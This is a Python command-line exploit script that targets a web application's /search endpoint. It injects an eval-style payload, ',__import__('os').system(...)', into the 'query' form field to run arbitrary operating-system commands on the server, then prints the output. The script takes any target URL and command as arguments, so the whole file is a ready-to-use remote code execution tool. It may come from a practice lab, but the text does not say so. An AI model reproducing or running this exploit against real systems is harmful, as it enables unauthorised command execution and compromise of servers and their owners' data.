#!/bin/python

import requests
import argparse
from pwn import *



def ctrl_C(signal,frame):
    print("[+] Existing ...")
    exit(1)

def send_command(cmd,url):
    payload=f"',__import__('os').system('{cmd}'))#'"
    url=f"{url}/search"
    send_data={
        'engine':'Google',
        'query':payload
    }

    send_request=requests.post(url,data=send_data)
    response=send_request.text

    for r in response.splitlines():
        if 'http' not in r:
            print(r)

def main():
    signal.signal(signal.SIGINT,ctrl_C)

    parser=argparse.ArgumentParser(description='Execute command')
    parser.add_argument('-u', '--url')
    parser.add_argument('-c','--command')
    args = parser.parse_args()
    
    if not args.url or not args.command:
        print("[!] URL and command must be provided.")
        parser.print_help()
    else:
        send_command(args.command, args.url)


if __name__=='__main__':
    main()
